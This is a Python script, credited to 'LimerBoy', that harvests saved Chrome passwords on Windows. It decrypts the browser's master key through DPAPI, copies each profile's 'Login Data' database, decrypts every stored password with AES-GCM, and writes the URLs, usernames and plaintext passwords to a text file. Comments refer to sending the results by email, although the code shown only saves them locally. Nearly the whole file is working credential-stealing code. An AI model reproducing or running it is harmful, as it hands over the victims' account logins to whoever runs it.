#Full Credits to LimerBoy
import os
import re
import json
import base64
import sqlite3
from win32 import win32crypt
from Cryptodome.Cipher import AES
import shutil


#GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None
        
def save_info(info: str):
    # Clear file
    with open("data/output.txt", "w") as f:
        f.write("")

    output = open("data/output.txt", mode="a", encoding="utf-8")
    output.write(info)
    output.write("\n\n")

if __name__ == '__main__':
    try:
        # Creating a dictionary for storing passwords
        passwords_dict = {}

        #(1) Get the secret key
        secret_key = get_secret_key()
        # Looking for a user profile or default folder
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
        for folder in folders:
            #(2) Getting ciphertext from sqlite database
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url != "" and username != "" and ciphertext != "":
                        #(3) Filter the initialization vector and encrypted password from the ciphertext
                        #(4) We use the AES algorithm to decrypt the password
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        # Store data in a dictionary
                        passwords_dict[url] = {
                            "username": username,
                            "password": decrypted_password
                        }
                # Closing the database connection
                cursor.close()
                conn.close()
                # Deleting the temporary database
                os.remove("Loginvault.db")

        # Forming a text string for sending
        message_body = "Saved passwords:\n\n"
        for url, credentials in passwords_dict.items():
            message_body += f"URL: {url}\nUsername: {credentials['username']}\nPassword: {credentials['password']}\n\n"

        # Calling a function to send an email
        save_info(message_body)

    except Exception as e:
        print("[ERR] %s" % str(e))